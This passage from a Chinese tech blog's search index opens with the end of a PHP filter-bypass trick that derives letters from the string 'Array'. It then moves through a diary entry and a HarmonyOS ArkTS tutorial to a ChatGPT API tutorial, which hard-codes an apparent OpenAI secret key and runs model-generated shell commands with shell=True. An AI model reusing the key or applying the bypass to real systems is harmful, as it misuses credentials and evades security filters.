所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。\n那么，如何拿到一个值为字符串’a’的变量呢？\n巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。\n在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array：\n\n再取这个字符串的第一个字母，就可以获得’A’了。\n","categories":["安全"]},{"title":"迄今为止","url":"/2020/04/11/%E5%9B%9B%E6%9C%88/%E8%BF%84%E4%BB%8A%E4%B8%BA%E6%AD%A2/","content":"说实话，好久没有写过这些东西了。\n在南京的时候，心里总是想着，要牛逼。技术要厉害。\n要会开发网站，要会安全，要会数模，要会机器学习。\n什么都想会，什么都想学。但是又懒的很。\n很悲催吧。更悲催的是，和朋友们讨论的时候，我居然还有一种优越感\n觉得自己比他们强，比他们牛逼。\n\n\n然而并不是这样的。无所谓人，无所谓物，是自己在自己的世界待的太久了。\n年轻气盛，不知天高地厚。妄想着什么都会。妄想着牛逼哄哄。\n沉下心来了吗？ 并没有。\n每一次在学校的时候，总是想着怎么这么难？怎么我还不会？\n怎么他们什么都会？怎么我这么垃圾？【笑\n其实还是偷懒吧。时间会证明很多东西。更何况是技术上的东西。\n沉下心情，坚持努力，不忘初心，先把小BBS开发做成功吧。\n下面写下这个月的安排\nCTF 每天一题！【仅仅一题   还有笔记 大概两个小时  早上7点10分\n开发训练  【早上8点&#x2F;下午3点30   4个小时\n机器学习  【晚上 9点30 -11点30  尤其重点\n","categories":["杂项"]},{"title":"鸿蒙开发入门与实践","url":"/2023/11/01/%E9%B8%BF%E8%92%99%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8%E4%B8%8E%E5%AE%9E%E8%B7%B5/","content":" 本文所有内容基于HarmonyOS开发者3.1&#x2F;4.0版本配套的开发者文档，对应鸿蒙SDK API能力级别为API 9 Release\n本文内容：\n1、介绍鸿蒙应用特点\n2、介绍鸿蒙应用开发基本概念\n3、能阅读并理解简单的鸿蒙应用代码、服务卡片代码\n4、介绍当前抖音服务卡片&amp;小艺建议\n背景【遥遥领先！】\n9月25日，华为在秋季全场景发布会上正式对外宣布启动HarmonyOS NEXT计划，即鸿蒙原生应用全面启动。 这也意味着鸿蒙操作系统（HarmonyOS）迭代四代后完全启动原生应用的时机已经成熟，条件已经具备，开启移动应用生态的新篇章。\n\n\n在这个未来环境的基础上，我们可以先前置了解一下如何进行鸿蒙原生开发。\n鸿蒙特点我们可以看到鸿蒙官方上的图：\n\n\nArkUI：极简的UI信息语法、丰富的UI组件、以及实时界面预览工具，只需使用一套ArkTS API，就能在多个HarmonyOS设备上提供生动而流畅的用户界面体验。\n\n\n\n元服务（原名原子化服务），是HarmonyOS提供的一种面向未来的服务提供方式。 有独立入口的（用户可通过点击方式直接触发） 免安装的（无需显式安装，由系统程序框架后台安装后即可使用） 可为用户提供一个或多个便捷服务的用户应用程序形态元服务**最主要的呈现形态就是鸿蒙服务卡片\n\n其将元服务&#x2F;应用的重要信息以卡片的形式展示在桌面，通过轻量交互行为实现服务直达。\n其主要特点为：\n\n免安装，更轻量化地将服务带给用户\n一键服务直达，将用户感兴趣的内容前置、外显\n跨端转移，多终端设备间无缝流转\n情景智能卡片推荐，随心定制、更懂用户「小艺建议」\n\n\n跨端流转：当多个设备通过分布式操作系统能够相互感知、进而整合成一个超级终端时，设备与设备之间就可以取长补短、相互帮助，为用户提供更加自然流畅的分布式体验。\n\n\n基本开发概念UI框架（开发语言）HarmonyOS提供了一套UI开发框架，即方舟开发框架（ArkUI框架）\n方舟开发框架针对不同目的和技术背景的开发者提供了两种开发范式\n\n基于ArkTS的声明式开发范式（简称“声明式开发范式”）\n兼容JS的类Web开发范式（简称“类Web开发范式”）\n\n\n官方文档3.0版本中是支持Java语言的，但是最新版本不支持了，ide创建新工程也没有了java语言的选项。\n\n开发范式名称语言生态UI更新方式适用场景适用人群声明式开发范式ArkTS语言数据驱动更新复杂度较大、团队合作度较高的程序移动系统应用开发人员、系统应用开发人员类Web开发范式JS语言数据驱动更新界面较为简单的程序应用和卡片Web前端开发人员\n应用模型（开发框架）应用模型是HarmonyOS为开发者提供的应用程序所需能力的抽象提炼，它提供了应用程序必备的组件和运行机制。\n\n简单理解 应用模型就类似一个框架，开发者在这个框架里去书写代码。类比前端框架React、Vue。\n\nHarmonyOS先后提供了两种应用模型：\n\nFA（Feature Ability）模型： HarmonyOS API 7开始支持的模型，已经不再主推。FA模型开发可见FA模型开发概述。\nStage模型： HarmonyOS API 9开始新增的模型，是目前主推且会长期演进的模型。\nStage模型提供UIAbility和ExtensionAbility两种类型的组件，这两种组件都有具体的类承载，支持面向对象的开发方式。\n\nUIAbility组件是一种包含UI界面的应用组件，主要用于和用户交互。\n\n例如，图库类应用可以在UIAbility组件中展示图片瀑布流，在用户选择某个图片后，在新的页面中展示图片的详细内容。同时用户可以通过返回键返回到瀑布流页面。\n\nUIAbility的生命周期只包含创建&#x2F;销毁&#x2F;前台&#x2F;后台等状态，与显示相关的状态通过WindowStage的事件暴露给开发者。\n\n\n\nExtensionAbility组件是一种面向特定场景的应用组件。\n\nFormExtensionAbility：FORM类型的ExtensionAbility组件，用于提供服务卡片场景相关能力。\nWorkSchedulerExtensionAbility：WORK_SCHEDULER类型的ExtensionAbility组件，用于提供延迟任务注册、取消、查询的能力。\n\n\n\n\n\n模型区别\n\n\n项目\nFA****模型\nStage模型\n\n\n\n应用组件\n1. 组件分类 PageAbility组件：包含UI界面，提供展示UI的能力。详细介绍请参见PageAbility组件概述。ServiceAbility组件：提供后台服务的能力，无UI界面。详细介绍请参见ServiceAbility组件概述。DataAbility组件：提供数据分享的能力，无UI界面。详细介绍请参见DataAbility组件概述。2. 开发方式通过导出匿名对象、固定入口文件的方式指定应用组件。开发者无法进行派生，不利于扩展能力。\n1. 组件分类UIAbility组件：包含UI界面，提供展示UI的能力，主要用于和用户交互。详细介绍请参见UIAbility组件概述。ExtensionAbility组件：提供特定场景（如卡片、输入法）的扩展能力，满足更多的使用场景。详细介绍请参见ExtensionAbility组件。 2. 开发方式采用面向对象的方式，将应用组件以类接口的形式开放给开发者，可以进行派生，利于扩展能力。\n\n\n进程模型\n有两类进程：1. 主进程2. 渲染进程详细介绍请参见进程模型。\n有三类进程：1. 主进程2. ExtensionAbility进程3. 渲染进程详细介绍请参见进程模型。\n\n\n线程模型\n1. ArkTS引擎实例的创建一个进程可以运行多个应用组件实例，每个应用组件实例运行在一个单独的ArkTS引擎实例中。 2. 线程模型每个ArkTS引擎实例都在一个单独线程（非主线程）上创建，主线程没有ArkTS引擎实例。3. 进程内对象共享：不支持。\n1. ArkTS引擎实例的创建一个进程可以运行多个应用组件实例，所有应用组件实例共享一个ArkTS引擎实例。2. 线程模型ArkTS引擎实例在主线程上创建。3. 进程内对象共享：支持。\n\n\n配置文件\n使用config.json描述应用信息、HAP信息和应用组件信息。详细介绍请参见应用配置文件概述（FA模型）。\n使用app.json5描述应用信息，module.json5描述HAP信息、应用组件信息。详细介绍请参见应用配置文件概述（Stage模型）。\n\n\n包结构基于Stage模型开发的应用，经编译打包后，其应用程序包结构如下图应用程序包结构（Stage模型）所示。\n\n\n\n\nHAP可分为Entry和Feature两种类型。Entry类型的HAP： 是应用的主模块，在module.json5配置文件中的type标签配置为“entry”类型。 在同一个应用中，同一设备类型只支持一个Entry类型的HAP，通常用于实现应用的入口界面、入口图标、主特性功能等。Feature类型的HAP： 是应用的动态特性模块，在module.json5配置文件中的type标签配置为“feature”类型。 一个应用程序包可以包含一个或多个Feature类型的HAP，也可以不包含。 Feature类型的HAP通常用于实现应用的特性功能，可以配置成按需下载安装，也可以配置成随Entry类型的HAP一起下载安装。 \n\n\n\n\n\n\n\n  一个应用包含一个或者多个Module，可以在DevEco Studio工程中创建一个或者多个Module。\nModule分为“Ability”和“Library”两种类型。\n\n“Ability”类型的Module对应于编译后的HAP（Harmony Ability Package）\n“Library”类型的Module对应于HAR（Harmony Archive），或者HSP（Harmony Shared Package）。\n\n一个Module可以包含一个或多个UIAbility组件，如下图所示。\nModule与UIAbility组件关系示意图：\n\n应用开发：待办清单下面以后续鸿蒙主推的Stage模型+ArkTs技术栈去Hello World。\n完成一个简单的UI效果和服务卡片设计。\n暂时无法在飞书文档外展示此内容\n前置基础IDE配置简单的配置就不说了，按照文档处理\n创建工程后的目录为\n详细如下：AppScope &gt; app.json5：应用的全局配置信息。entry：HarmonyOS工程模块，编译构建生成一个HAP包。src &gt; main &gt; ets：用于存放ArkTS源码。src &gt; main &gt; ets &gt; entryability：应用&#x2F;服务的入口。src &gt; main &gt; ets &gt; entryformability：服务卡片的Ability。src &gt; main &gt; ets &gt; pages：应用&#x2F;服务包含的页面。src &gt; main &gt; resources：用于存放应用&#x2F;服务所用到的资源文件，如图形、多媒体、字符串、布局文件等。关于资源文件，详见资源分类与访问。src &gt; main &gt; module.json5：Stage模型模块配置文件。主要包含HAP包的配置信息、应用&#x2F;服务在具体设备上的配置信息以及应用&#x2F;服务的全局配置信息。具体的配置文件说明，详见module.json5配置文件。oh_modules：用于存放三方库依赖信息。关于原npm工程适配ohpm操作，请参考历史工程迁移。build-profile.json5：应用级配置信息，包括签名、产品配置等。\nArkTS简单入门ArkTS是HarmonyOS优选的主力应用开发语言。\n它在TypeScript（简称TS）的基础上，匹配ArkUI框架，扩展了声明式UI、状态管理等相应的能力，让开发者以更简洁、更自然的方式开发跨端应用。要了解什么是ArkTS，我们首先要了解下ArkTS、TypeScript和JavaScript之间的关系：\n\nJavaScript是一种属于网络的高级脚本语言，已经被广泛用于Web应用开发，常用来为网页添加各式各样的动态功能，为用户提供更流畅美观的浏览效果。\nTypeScript 是 JavaScript 的一个超集，它扩展了 JavaScript 的语法，通过在JavaScript的基础上添加静态类型定义构建而成，是一个开源的编程语言。\nArkTS兼容TypeScript语言，拓展了声明式UI、状态管理、并发任务等能力。\n\n由此可知，TypeScript是JavaScript的超集，ArkTS则是TypeScript的超集，他们的关系如下图所示：\n\nTypeScript快速入门：https://developer.huawei.com/consumer/cn/training/course/slightMooc/C101667356568959645\n声明式UI在ArkUI中，UI显示的内容均为组件，由框架直接提供的称为系统组件，由开发者定义的称为自定义组件。\n\n\n@Component：@Component装饰器仅能装饰struct关键字声明的数据结构。struct被@Component装饰后具备组件化的能力，需要实现build方法描述UI，一个struct只能被一个@Component装饰。\nbuild()函数：build()函数用于定义自定义组件的声明式UI描述，自定义组件必须定义build()函数。\n@Entry：@Entry装饰的自定义组件将作为UI页面的入口。\n\n// 入口UI@Entry@Componentstruct ToDoListPage &#123;  private totalTasks: Array&lt;string&gt; = [];  aboutToAppear() &#123;    this.totalTasks = DataModel.getData();  &#125;  build() &#123;    //  列布局    Column(&#123; space: CommonConstants.COLUMN_SPACE &#125;) &#123;    // 标题文案      Text($r(&#x27;app.string.page_title&#x27;))        .fontSize($r(&#x27;app.float.title_font_size&#x27;))        .fontWeight(FontWeight.Bold)        .lineHeight($r(&#x27;app.float.title_font_height&#x27;))        .width(CommonConstants.TITLE_WIDTH)        .margin(&#123;          top: $r(&#x27;app.float.title_margin_top&#x27;),          bottom: $r(&#x27;app.float.title_margin_bottom&#x27;)        &#125;)        .textAlign(TextAlign.Start)              // 遍历添加item元素      ForEach(this.totalTasks, (item: string) =&gt; &#123;        ToDoItem(&#123; content: item &#125;)      &#125;, (item: string) =&gt; JSON.stringify(item))      // 一个按钮      Button() &#123;        Text(&#x27;跳转页面&#x27;)          .fontSize(30)          .fontWeight(FontWeight.Bold)      &#125;      .onClick(() =&gt; &#123;        console.info(`Succeeded in clicking the &#x27;Next&#x27; button.`)        // 跳转到第二页        router.pushUrl(&#123; url: &#x27;pages/NextPage&#x27; &#125;).then(() =&gt; &#123;          console.info(&#x27;Succeeded in jumping to the second page.&#x27;)        &#125;).catch((err) =&gt; &#123;          console.error(`Failed to jump to the second page.Code is $&#123;err.code&#125;, message is $&#123;err.message&#125;`)        &#125;)&#125;      )      .type(ButtonType.Capsule)      .margin(&#123;        top: 20      &#125;)      .backgroundColor(&#x27;#0D9FFB&#x27;)      .width(&#x27;40%&#x27;)      .height(&#x27;5%&#x27;)    &#125;    .width(CommonConstants.FULL_LENGTH)    .height(CommonConstants.FULL_LENGTH)    .backgroundColor($r(&#x27;app.color.page_background&#x27;))  &#125;&#125;// 自定义组件@Componentexport default struct ToDoItem &#123;  private content?: string;  // 数据驱动UI  // @State当这些状态数据被修改时，将会调用所在组件的build方法进行UI刷新。  @State isComplete: boolean = false;  @Builder labelIcon(icon: Resource) &#123;    Image(icon)      .objectFit(ImageFit.Contain)      .width($r(&#x27;app.float.checkbox_width&#x27;))      .height($r(&#x27;app.float.checkbox_width&#x27;))      .margin($r(&#x27;app.float.checkbox_margin&#x27;))  &#125;  build() &#123;  // 行布局    Row() &#123;    // 切换label的样式      if (this.isComplete) &#123;        this.labelIcon($r(&#x27;app.media.ic_ok&#x27;));      &#125; else &#123;        this.labelIcon($r(&#x27;app.media.ic_default&#x27;));      &#125;      // 文案内容      Text(this.content)        .fontSize($r(&#x27;app.float.item_font_size&#x27;))        .fontWeight(CommonConstants.FONT_WEIGHT)        // 切换文案的样式        .opacity(this.isComplete ? CommonConstants.OPACITY_COMPLETED : CommonConstants.OPACITY_DEFAULT)        .decoration(&#123; type: this.isComplete ? TextDecorationType.LineThrough : TextDecorationType.None &#125;)    &#125;    .borderRadius(CommonConstants.BORDER_RADIUS)    .backgroundColor($r(&#x27;app.color.start_window_background&#x27;))    .width(CommonConstants.LIST_DEFAULT_WIDTH)    .height($r(&#x27;app.float.list_item_height&#x27;))    .onClick(() =&gt; &#123;      // 点击后设置数据      this.isComplete = !this.isComplete;    &#125;)  &#125;&#125;\n\n状态管理组件状态管理装饰器用来管理组件中的状态，它们分别是：@State、@Prop、@Link。\n\n@State装饰的变量是组件内部的状态数据，当这些状态数据被修改时，将会调用所在组件的build方法进行UI刷新。\n@Prop与@State有相同的语义，但初始化方式不同。@Prop装饰的变量必须使用其父组件提供的@State变量进行初始化，允许组件内部修改@Prop变量，但更改不会通知给父组件，即@Prop属于单向数据绑定。\n@Link装饰的变量可以和父组件的@State变量建立双向数据绑定，需要注意的是：@Link变量不能在组件内部进行初始化。\n@Builder装饰的方法用于定义组件的声明式UI描述，在一个自定义组件内快速生成多个布局内容。\n\n@State、@Prop、@Link三者关系如图所示：\n\n简单UI界面开发1、UIAbility应用组件UIAbility组件是一种包含UI界面的应用组件，主要用于和用户交互。\nUIAbility组件是系统调度的基本单元，为应用提供绘制界面的窗口\n一个UIAbility组件中可以通过多个页面来实现一个功能模块。\n\nexport default class EntryAbility extends UIAbility &#123;    onWindowStageCreate(windowStage: window.WindowStage) &#123;        // Main window is created, set main page for this ability        hilog.info(0x0000, &#x27;testTag&#x27;, &#x27;%&#123;public&#125;s&#x27;, &#x27;Ability onWindowStageCreate&#x27;);        // 启动该应用组件后进入的页面为：ToDoListPage        windowStage.loadContent(&#x27;pages/ToDoListPage&#x27;, (err, data) =&gt; &#123;            if (err.code) &#123;                hilog.error(0x0000, &#x27;testTag&#x27;, &#x27;Failed to load the content. Cause: %&#123;public&#125;s&#x27;, JSON.stringify(err) ?? &#x27;&#x27;);                return;            &#125;            hilog.info(0x0000, &#x27;testTag&#x27;, &#x27;Succeeded in loading the content. Data: %&#123;public&#125;s&#x27;, JSON.stringify(data) ?? &#x27;&#x27;);        &#125;);    &#125;&#125;\n\n2、ArkTs编写对应的页面上述的声明式UI中编写了两个页面\n3、设置新页面路由信息main_page.json文件内，编写页面信息\n&#123;  &quot;src&quot;: [    // 第一个页面    &quot;pages/ToDoListPage&quot;,    // 第二个页面    &quot;pages/NextPage&quot;  ]&#125;\n\n服务卡片开发\n服务卡片，在体验上类似于widget的表现，但是鸿蒙系统做了些优化，比如多个卡片可以折叠在一块、鸿蒙小艺建议可以显示应用的服务卡片等等。\n基本概念\n\n卡片使用方：如上图中的桌面，显示卡片内容的宿主应用，控制卡片在宿主中展示的位置。\n应用图标：应用入口图标，点击后可拉起应用进程，图标内容不支持交互。\n卡片：具备不同规格大小的界面展示，卡片的内容可以进行交互，如实现按钮进行界面的刷新、应用的跳转等。\n\n\n卡片提供方：包含卡片的应用，提供卡片的显示内容、控件布局以及控件点击处理逻辑。\nFormExtensionAbility：卡片业务逻辑模块，提供卡片创建、销毁、刷新等生命周期回调。\n卡片页面：卡片UI模块，包含页面控件、布局、事件等显示和交互信息。\n\n\n\nIDE创建卡片卡片的开发目前相对简单，IDE快速创建即可。\n\n卡片Abilityexport default class EntryFormAbility extends FormExtensionAbility &#123;  onAddForm(want) &#123;    console.info(&#x27;[EntryFormAbility] onAddForm&#x27;);    // 在入参want中可以取出卡片的唯一标识：formId    let formId: string = want.parameters[formInfo.FormParam.IDENTITY_KEY];    // 使用方创建卡片时触发，提供方需要返回卡片数据绑定类    let obj = &#123;      &#x27;title&#x27;: &#x27;titleOnAddForm&#x27;,      &#x27;detail&#x27;: &#x27;detailOnAddForm&#x27;    &#125;;    let formData = formBindingData.createFormBindingData(obj);    return formData;  &#125;  onUpdateForm(formId) &#123;    // 若卡片支持定时更新/定点更新/卡片使用方主动请求更新功能，则提供方需要重写该方法以支持数据更新    console.info(&#x27;[EntryFormAbility] onUpdateForm&#x27;);    let obj = &#123;      &#x27;title&#x27;: &#x27;titleOnUpdateForm&#x27;,      &#x27;detail&#x27;: &#x27;detailOnUpdateForm&#x27;    &#125;;    let formData = formBindingData.createFormBindingData(obj);    formProvider.updateForm(formId, formData).catch((err) =&gt; &#123;      if (err) &#123;        // 异常分支打印        console.error(`[EntryFormAbility] Failed to updateForm. Code: $&#123;err.code&#125;, message: $&#123;err.message&#125;`);        return;      &#125;    &#125;);  &#125;  onRemoveForm(formId) &#123;    // Called to notify the form provider that a specified form has been destroyed.    // 当对应的卡片删除时触发的回调，入参是被删除的卡片ID    console.info(&#x27;[EntryFormAbility] onRemoveForm&#x27;);  &#125;&#125;\n\n卡片UI\n实现简单的点击旋转\n@Entry@Componentstruct WidgetCard &#123;  /*   * The height percentage setting.   */  readonly FULL_HEIGHT_PERCENT: string = &#x27;100%&#x27;;  @State myWidth: number = 100;  @State myHeight: number = 50;  // 标志位，true和false分别对应一组myWidth、myHeight值  @State flag: boolean = false;  build() &#123;    Column(&#123; space: 10 &#125;) &#123;      Button(&quot;text&quot;)        .type(ButtonType.Normal)        .width(this.myWidth)        .height(this.myHeight)        .margin(20)      Button(&quot;area: click me&quot;)        .fontSize(12)        .margin(20)        .onClick(() =&gt; &#123;          animateTo(&#123; duration: 1000, curve: Curve.Ease &#125;, () =&gt; &#123;            // 动画闭包中根据标志位改变控制第一个Button宽高的状态变量，使第一个Button做宽高动画            if (this.flag) &#123;              this.myWidth = 100;              this.myHeight = 50;            &#125; else &#123;              this.myWidth = 200;              this.myHeight = 100;            &#125;            this.flag = !this.flag;          &#125;);        &#125;)    &#125;    .width(&quot;100%&quot;)    .height(&quot;100%&quot;)    .onClick(() =&gt; &#123;      postCardAction(this, &#123;        &quot;action&quot;: &#x27;router&#x27;,        &quot;abilityName&quot;: &#x27;EntryAbility&#x27;,        &quot;params&quot;: &#123;          &quot;message&quot;: &#x27;add detail&#x27;        &#125;      &#125;);    &#125;)  &#125;&#125;\n\n卡片数据交互\n\n系统刷新后，调用FormExtensionAbility去刷新widget。\n业务逻辑主动更改卡片数据。\n\n元服务元服务和应用开发的差别主要在于是否免安装。\n&quot;installationFree&quot;: false\n\n主要通过该参数来确定应用是否免安装。\n\n目前经过测试发现\nStage应用模型不支持修改该参数\nFA应用模型支持修改该参数将正常应用更改为不需安装的元服务应用。\n\nhttps://developer.huawei.com/consumer/cn/doc/distribution/service/fa-dev-process-0000001491675000\n参考文档：官方文档：https://developer.harmonyos.com/cn/docs/documentation/doc-guides-V3/start-overview-0000001478061421-V3?catalogVersion=V3\n鸿蒙开发者文档：https://developer.huawei.com/consumer/cn/ HelloWorld：https://developer.huawei.com/consumer/cn/training/course/slightMooc/C101667303102887820?ha_linker=eyJ0cyI6MTY5NTgwNDc2MTUyMiwiaWQiOiI3Yzk1MzQzNTk0ZTJhMjUzNTZjOWYyNzQ0MmI5Mjk5OSJ9\n分布式文件服务：https://bbs.huaweicloud.com/blogs/381553\n系统能力API文档：https://developer.harmonyos.com/cn/docs/documentation/doc-references-V3/syscap-0000001408089368-V3?catalogVersion=V3\n暂时无法在飞书文档外展示此内容\n"},{"title":"ChatGpt的api使用入门","url":"/2023/03/14/ChatGpt%E7%9A%84api%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/","content":"一、前言两周前已经介绍了ChatGpt的相关账号注册、apiKey的获取，以及关键的Prompt提示语。\n而在知晓了如何注册、如何通过引导语获得我们想要的回答之后，本文将介绍如何使用openai的一些接口，让我们能够使用现有的AI接口来构建一些应用和工具。\n\n二、API介绍openapi官网：OpenAI API\n官方doc文档：https://platform.openai.com/docs/introduction\nOpenAI API 几乎可以应用于任何涉及理解或生成自然语言、代码或图像的任务。\n其提供一系列具有不同功率级别的模型，适用于不同的任务，这些模型可用于从内容生成到语义搜索和分类的所有领域。\n1、名词解释Token：openai的模型是通过将文本分解为名为token的较小单元来处理文本。token可以是单词，单词块或单个字符。\n通过下面的文本来举例，其是如何被分解为token的： I have an orange cat named Butterscotch. 常见的单词，如“cat”，是一个单独的token，而不常用的单词通常会分解为多个token。例如，“Butterscotch”会转换为四个token：“But”、“ters”、“cot”和“ch”。\n当前gpt-3.5-turbo计费价格为1000token&#x2F;0.002美元\nTemperaturetemperature是一种超参数，在一些自然语言处理模型中被使用，包括ChatGPT，用于控制生成文本中的随机性或“创造性”水平。\n 简而言之，温度越低，结果就越确定，因为模型将始终选择最可能的下一个token。增加温度可能会导致更多的随机性，从而鼓励更多样化或创造性的输出。我们实际上是增加了其他可能token的权重。\n在应用方面，我们可能希望对于基于事实的问答等任务使用较低的温度值，以鼓励更加事实和简洁的回答。对于生成诗歌或其他创意任务，增加温度值可能会更有益。\n\n\n有兴趣可以在文档中拖动temperature尝试 https://platform.openai.com/docs/quickstart/adjust-your-settings\n\n\nTop_ptop_p 是 OpenAI GPT 系列模型中的一个参数，用于控制生成文本的多样性。\n通过调整 top_p 的值，可以控制生成文本的多样性。较小的 top_p 值会导致生成文本较为保守，而较大的 top_p 值会导致生成文本更加自由和多样化。\n通常，建议在调整 top_p 值时，将其设置在 0.1 到 0.9 的范围内，一般改变top_p或Temperature，但不是两者兼而有之。\n2、Api的简单使用1、直接发起请求platform.openai.com\n既然是RESTful的请求，当然可以直接按照http的格式发起请求\n官网中的实例如下：\ncurl https://api.openai.com/v1/chat/completions \\  -H &quot;Content-Type: application/json&quot; \\  -H &quot;Authorization: Bearer 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&quot; \\  -d &#x27;&#123;    &quot;model&quot;: &quot;gpt-3.5-turbo&quot;,    &quot;messages&quot;: [&#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;Hello!&quot;&#125;]  &#125;&#x27;\n\n一般我们在网页上使用chatGpt直接就传入一段prompt就完了，但是api中有所不同。\napi的入参从一段 Prompt 变成了一个数组，数组的每个元素都有 role 和 content 两个字段。\n role 这个字段一共有三个参数可以选择，分别是 \n\nuser 代表用户\nassistant 代表 AI 的回答。 \nsystem 代表系统，其content里的内容代表我们给 AI 的一个指令，也就是告诉 AI 应该怎么回答用户的问题\n\n\n当 role 是 user 或者 assistant 的时候，content 里面的内容就代表用户和 AI 对话的内容。\n\n发起请求，得到对应的返回值：\n\n2、使用openai封装的库openai官方提供了python、node.js的脚本库，此外其他开源爱好者也提供了各类语言的sdk接入方式。\n例如go的接入方式：https://github.com/sashabaranov/go-openai\n这里主要以Python为例，简要的使用python完成调用\n其必要的东西是：\n\nOpenai的python库\npip install openai\n\n\nopenai的key\n\nimport openaiopenai.api_key = &quot;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&quot;response = openai.ChatCompletion.create(  model=&quot;gpt-3.5-turbo&quot;,  messages=[        &#123;&quot;role&quot;: &quot;system&quot;, &quot;content&quot;: &quot;You are a helpful assistant.&quot;&#125;,        &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;Who won the world series in 2020?&quot;&#125;,        &#123;&quot;role&quot;: &quot;assistant&quot;, &quot;content&quot;: &quot;The Los Angeles Dodgers won the World Series in 2020.&quot;&#125;,        &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;Where was it played?&quot;&#125;    ])\n\n三、基于python+ChatGpt构建一个听懂人话的命令行工具1、需求介绍制作一个能够听懂人话的工具，我们表达想要完成的内容，它能够告诉我们应该怎么去写对应的命令\n例如下面的创建5个txt文件，名字类似，我们不需要写完整所有的内容，ai就能够告知我们最终的是什么命令：\n\n需求分析：\n1、能够使用cgpt xxx就可以执行\n2、能够理解文本的内容转化成mac可执行的命令\n3、能够按下enter运行，同时输入任意命令可以不执行\n4、终端上的输出相对美观\n2、使用cgpt xxx就可以执行对应脚本实质上就是将python文件变为mac的执行脚本文件，直接问！\n\nPrompt:\n我有一个名为cgpt的python命令行工具的脚本，我想将这个脚本变为mac上的可执行脚本文件 这样我打开终端，无论在任何位置直接输入cgpt命令，就可以运行这个python脚本\n\n\n2、构建可用的prompt理解文本的内容转化成mac可执行的命令，这一步是整个工具的关键能力。\n而「转化文本内容并只输出对应的命令」，其实质就是构建一个能够满足我们需求的****prompt。\nprompt调试的工具可以使用：\nplatform.openai.com\na、你是mac电脑专家\n我们希望输出的命令行是正确的，不需要ai的输出有创造性和多样性，所以在右边设置了其Temperature和Top P都为0。\n在完成设置之后，可以看到在上述promot下，其输出含有大量的解释，和预期的输出不一致。\n可以增加限制和举例，让ai能够理解我们的诉求，输出我们想要的东西。\nb、举例和增加限制\n如此我们就通过增加限制和简单的举例，得到了想要的输出。\n最终的prompt为：\n\n你是一个mac电脑专家，能够把自然语言翻译成在mac上命令行语句。\n另外你要遵循下面的几条规则：\n1、简单地输出翻译后的指令,不需要做任何说明或解释。\n2、如果你不理解我在说什么或者不确定如何将我的指令转换成计算机命令行，简单地输出7个字母“UNKNOWN”。\n3、如果翻译结果包含多行命令，请使用“&amp;”或“&amp;&amp;”将它们组合成一行命令。\n#USER        \n翻墙\n#ASSISTANT\nUNKNOWN\n\n3、编写python脚本对于python也没有非常的熟悉，直接上手去写一个命令行工具可能需要一定的时间去查阅各类库包等等。\n对此，直接咨询chatgpt好了。\na、Basic Prompt Framework查阅了关于 ChatGPT prompt 的框架资料，这里使用的是Elavis Saravia 总结的框架，他认为一个 prompt 里需包含以下几个元素：\n\nInstruction（必须）： 指令，即你希望模型执行的具体任务。\nContext（选填）： 背景信息，或者说是上下文信息，这可以引导模型做出更好的反应。\nInput Data（选填）： 输入数据，告知模型需要处理的数据。\nOutput Indicator（选填）： 输出指示器，告知模型我们要输出的类型或格式。\n\n只要你按照这个框架写 prompt ，模型返回的结果都不会差。\n当然，你在写 prompt 的时候，并不一定要包含所有4个元素，而是可以根据自己的需求排列组合，一般使用Instruction + Context + Input Data就可以\nb、python脚本对应的prompt\n我希望创建一个python命令行工具脚本，它的名字为cligpt\n这个python脚本在mac上运行，例如我在mac终端上执行：\npython3 cligpt 查看当前所有文件\n脚本会将「查看当前所有文件」认为是一个输入值，他会将这个输入值给chatgpt的api，api会返回一个mac上的可执行的命令并显示在终端上，如其返回了：\nls \n这时我按下enter键就可以执行这个命令，另外输入非enter键就不会执行这个文件\n\n输入上述的prompt就可以得到下面的脚本：\n#!/usr/bin/env python3import openai_secret_managerimport openaiimport argparseimport sysimport subprocess# 连接到OpenAI APIopenai.api_key = &quot;api_key&quot;# 定义解析器parser = argparse.ArgumentParser(description=&quot;CLI for running terminal commands using OpenAI&#x27;s GPT language model&quot;)# 添加参数parser.add_argument(&quot;command&quot;, help=&quot;The command to run in the terminal&quot;, nargs=&quot;+&quot;)# 解析参数args = parser.parse_args()# 将命令组合成一个字符串command = &quot; &quot;.join(args.command)# 使用OpenAI GPT-3 API生成命令response = openai.Completion.create(    engine=&quot;davinci-codex&quot;,    prompt=f&quot;Given the following command-line input, generate the corresponding command:\\n\\n&#123;command&#125;\\n\\nCommand:&quot;,    temperature=0.5,    max_tokens=2048,)# 获取API返回的生成的命令generated_command = response.choices[0].text.strip()# 在终端中打印生成的命令print(f&quot;Generated command: &#123;generated_command&#125;&quot;)# 如果用户按下回车，则执行生成的命令if input(&quot;Press enter to run the command, or any other key to cancel...&quot;) == &quot;&quot;:    subprocess.run(generated_command, shell=True)\n\n这个脚本能够初步满足我们的要求，但是还有以下的问题存在：\n1、脚本中chatgpt的模型为davinci-codex，不是chat-gpt3.5\n2、脚本的执行太粗糙，终端上的显示效果不够美观\nc、优化样式及修改model我们让chatgpt优化及美化脚本\n\n\n之后我将模型和对应上文设计好的prompt放入脚本之中\n最终的产物如下：\nimport clickimport subprocessfrom rich.console import Consolefrom questionary import confirmfrom typing import Optionalimport openaiopenai.api_key = &quot;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&quot;# Call OpenAI GPT-3 API to get command based on user inputdef generate_command(user_input: str) -&gt; str:    # 使用OpenAI GPT-3 API生成命令    response = openai.ChatCompletion.create(        model=&quot;gpt-3.5-turbo&quot;,        messages=[        &#123;&quot;role&quot;: &quot;system&quot;, &quot;content&quot;: &quot;&quot;&quot;        你是一个命令行翻译程序。你可以将自然语言指令从人类语言翻译成mac上相应的命令行语句。        1、简单地输出翻译后的指令,不需要做任何解释。        2、如果你不理解我在说什么或者不确定如何将我的指令转换成计算机命令行，简单地输出7个字母“UNKNOWN”，不做其他解释。        3、如果翻译结果包含多行命令，请使用“&amp;”或“&amp;&amp;”将它们组合成一行命令。        # USER        查看当前文件        # ASSISTANT        cat        &quot;&quot;&quot;&#125;,        &#123;&quot;role&quot;: &quot;user&quot;, 